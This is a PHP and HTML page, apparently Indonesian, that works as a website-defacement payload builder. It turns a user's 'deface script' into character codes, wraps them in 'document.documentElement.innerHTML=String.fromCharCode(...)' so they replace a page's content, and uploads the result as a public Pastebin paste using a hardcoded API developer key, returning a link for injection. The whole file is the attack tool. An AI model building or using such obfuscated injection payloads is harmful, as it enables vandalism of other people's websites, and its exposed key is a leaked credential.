
<script>
    function runCharCodeAt() {
      input = document.charCodeAt.input.value;
      output = "";
      for(i=0; i<input.length; ++i) {
        if (output != "") output += ", ";
        output += input.charCodeAt(i);
      }
      document.charCodeAt.output.value = output;
    }
  </script>

<form name="charCodeAt" method="post">
  <div class="form-group">
    <textarea class="form-control" rows="8" name="input" placeholder="Script deface"></textarea><br>
    <input class="btn btn-primary is-loading" type="button" onclick="runCharCodeAt()" value="Convert"><br><br>
    <textarea class="form-control" rows="8" name="output" placeholder="hasil"></textarea><br>
    <input class="btn btn-primary is-loading" type="submit" name="submit" value="Create"><br>
      </div>
</form>
<?php 

if (isset($_POST['submit'])) {
  if (empty($_POST['output'])) {
    echo "<script>alert('Convert Script Dulu!');</script>";
  }else{

$isi = $_POST['output'];
$random = rand(1, 99999999);
$api_dev_key            = '8f50ade941af8287882ec098a9467508'; // your api_developer_key
$api_paste_code         = "document.documentElement.innerHTML=String.fromCharCode(".$isi.")"; // your paste text
$api_paste_private      = '0'; // 0=public 1=unlisted 2=private
$api_paste_name         = $random; // name or title of your paste
$api_paste_expire_date      = 'N';
$api_paste_format       = 'text';
$api_user_key           = ''; // if an invalid or expired api_user_key is used, an error will spawn. If no api_user_key is used, a guest paste will be created
$api_paste_name         = urlencode($api_paste_name);
$api_paste_code         = urlencode($api_paste_code);
 
$url                = 'https://pastebin.com/api/api_post.php';
$ch                 = curl_init($url);
 
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=paste&api_user_key='.$api_user_key.'&api_paste_private='.$api_paste_private.'&api_paste_name='.$api_paste_name.'&api_paste_expire_date='.$api_paste_expire_date.'&api_paste_format='.$api_paste_format.'&api_dev_key='.$api_dev_key.'&api_paste_code='.$api_paste_code.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_NOBODY, 0);

  $headers = array();
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

  $result = curl_exec($ch);
  if (curl_errno($ch)) {
      echo 'Error:' . curl_error($ch);
  }
  curl_close($ch);
  // var_dump($result);
  $ress = $result;
  echo "<h1>Result :</h1>";
  echo "<input class='form-control' type='text' value='$ress' id='pilih' readonly />";
  echo "<button class='btn btn-primary' type='button' onclick='copy_text()'>Copy</button>";
}}

?>
